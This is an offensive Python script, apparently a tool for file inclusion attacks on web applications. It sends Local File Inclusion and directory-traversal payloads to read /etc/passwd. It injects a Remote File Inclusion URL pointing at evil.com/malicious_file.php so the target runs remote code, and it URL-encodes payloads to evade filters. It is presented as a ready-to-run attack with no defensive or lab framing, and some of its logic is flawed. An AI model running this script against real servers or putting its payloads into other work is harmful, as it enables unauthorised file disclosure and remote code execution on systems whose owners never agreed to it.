import requests
import urllib.parse
import random
import string

class FileInclusionAdvanced:
    def __init__(self, target_url, vulnerable_param, headers=None):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.headers = headers if headers else {'User-Agent': 'Mozilla/5.0'}

    def generate_payload(self, filename=""):
        """
        Generate payloads for Local File Inclusion or Remote File Inclusion.
        """
        # Local File Inclusion Payload
        lfi_payload = f"{self.vulnerable_param}={filename}"
        return lfi_payload

    def directory_traversal(self, file_name=""):
        """
        Test for directory traversal vulnerabilities.
        """
        traversal_payload = f"{self.vulnerable_param}=../../../../{file_name}"
        return traversal_payload

    def local_file_inclusion(self, payload):
        """
        Attempt Local File Inclusion (LFI) attack by injecting file path.
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "root" in response.text or "etc/passwd" in response.text:
                print(f"Local File Inclusion successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during LFI test: {e}")
        return False

    def remote_file_inclusion(self, payload):
        """
        Attempt Remote File Inclusion (RFI) attack by injecting URL of remote file.
        """
        url = f"{self.target_url}?{payload}"
        
        try:
            response = requests.get(url, headers=self.headers)
            if "RFI" in response.text:  # Customize based on target response
                print(f"Remote File Inclusion successful with payload: {payload}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error during RFI test: {e}")
        return False

    def bypass_filter(self, payload):
        """
        Try bypassing filters by obfuscating input or encoding.
        """
        encoded_payload = urllib.parse.quote(payload)
        return encoded_payload

    def execute_attack(self):
        """
        Run Local File Inclusion (LFI) and Remote File Inclusion (RFI) with directory traversal and filter bypass.
        """
        print(f"Initiating File Inclusion attack on {self.target_url}")

        # Test LFI
        lfi_payload = self.generate_payload("/etc/passwd")
        if self.local_file_inclusion(lfi_payload):
            print("LFI successful!")

        # Test Remote File Inclusion
        rfi_payload = self.generate_payload("http://evil.com/malicious_file.php")
        if self.remote_file_inclusion(rfi_payload):
            print("RFI successful!")

        # Test Directory Traversal
        traversal_payload = self.directory_traversal("etc/passwd")
        if self.local_file_inclusion(traversal_payload):
            print("Directory Traversal successful!")

        # Test Bypass Filter (encoded payload)
        encoded_payload = self.bypass_filter("/etc/passwd")
        if self.local_file_inclusion(encoded_payload):
            print("Bypassed filter successfully with encoded payload!")
